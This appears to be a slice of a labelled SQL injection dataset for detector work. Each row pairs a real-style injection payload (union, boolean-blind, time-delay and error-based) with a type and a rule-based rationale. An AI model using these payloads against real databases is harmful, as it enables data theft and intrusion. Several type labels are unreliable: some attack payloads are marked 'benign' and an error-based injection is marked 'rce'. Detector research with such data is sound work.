row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5460,"-2667 ) union all select 5848,5848,5848,5848--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5461,1'|| ( select 'allj' where 7334 = 7334,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5462,"1"" and elt ( 4249 = 4249,7259 ) and ""kgtz"" like ""kgtz",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
5463,"1%' and elt ( 1210 = 1210,sleep ( 5 ) ) and '%' = '",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5464,"1%' ) ) ) union all select null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5465,-5694 ) ) as cxnb where 6858 = 6858 or 9323 = 9323#,1,,boolean_blind,generic,0.95,6858 = 6858 or detected — boolean_blind injection (priority 8) on generic,rule-based
5466,"-5597' ) or make_set ( 2490 = 2164,2164 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5467,1'|| ( select 'ptkj' from dual where 6263 = 6263 union all select null--,1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
5468,1 ) as jdhz where 2021 = 2021,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5469,"1%' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5470,"1"" ) where 9223 = 9223 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
5471,"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'zovb' like 'zovb",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
